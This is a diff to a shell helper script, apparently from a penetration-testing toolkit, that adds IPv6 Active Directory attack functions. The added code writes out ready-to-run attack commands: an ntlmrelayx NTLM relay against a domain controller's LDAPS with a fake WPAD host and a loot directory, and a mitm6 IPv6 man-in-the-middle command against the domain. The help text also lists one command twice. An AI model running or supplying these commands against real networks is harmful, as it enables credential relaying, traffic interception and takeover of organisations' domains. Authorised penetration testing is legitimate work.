@@ -13,7 +13,9 @@ The nb-ad-ipv6 namespace contains commands for
 Commands
 --------
 nb-ad-ipv6-install         installs dependencies
-nb-ad-ntlmrelayx           set up ntlm relay
+nb-ad-ipv6-ntlmrelayx      set up ntlm relay
+nb-ad-ipv6-ntlmrelayx      set up ntlm relay
+nb-ad-ipv6-mitm6           set up man in the middle for ipv6
 
 DOC
 }
@@ -33,17 +35,17 @@ nb-ad-ipv6-install() {
     fi
 }
 
-nb-ad-ntlmrelayx() {
+nb-ad-ipv6-ntlmrelayx() {
     __check-project
 	  __check-domain
 	  __ask "Enter the IP address of the target DC server"
 	  nb-vars-set-rhost
 
-
-    __ask "Enter a user account"
-    nb-vars-set-user
-    __ask "Enter a password for authentication"
-    nb-vars-set-pass
-
     print -z "ntlmrelayx.py -6 -t ldaps://${__RHOST} -wh fakewpad.${__DOMAIN} -l lootme"
+}
+
+nb-ad-ipv6-mitm6() {
+	  __check-domain
+
+    print -z "sudo mitm6 -d ${__DOMAIN}"
 }
